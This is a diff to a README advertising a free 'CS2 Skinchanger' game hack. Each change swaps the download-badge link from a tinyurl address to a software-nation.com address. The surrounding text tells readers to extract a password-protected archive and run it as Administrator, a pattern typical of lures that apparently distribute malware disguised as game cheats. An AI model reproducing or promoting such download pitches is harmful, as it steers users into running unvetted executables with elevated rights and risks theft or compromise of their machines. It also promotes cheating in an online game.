@@ -10,7 +10,7 @@ The **🎨 CS2 Skinchanger (April Updated)** is a **free** skin hack that lets y
 
 <div align="center">
 
-[![Download CS2 Skinchanger](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/cs2-skinchanger-april-updated)
+[![Download CS2 Skinchanger](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/cs2-skinchanger-april-updated)
 
 </div>
 
@@ -97,7 +97,7 @@ Why spend thousands of dollars on CS2 skins when you can get them for free? This
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Select your skins → Play.
 
-[![Download CS2 Skinchanger](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/cs2-skinchanger-april-updated)
+[![Download CS2 Skinchanger](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/cs2-skinchanger-april-updated)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -228,7 +228,7 @@ Get every CS2 skin for free. **CS2 Skinchanger (April Updated)** is a free skin 
 
 <div align="center">
 
-[![Download CS2 Skinchanger](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/cs2-skinchanger-april-updated)
+[![Download CS2 Skinchanger](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/cs2-skinchanger-april-updated)
 
 **Version 6.3.0** — Free skin hack. April 2026 update. Zero cost. No payment.
 
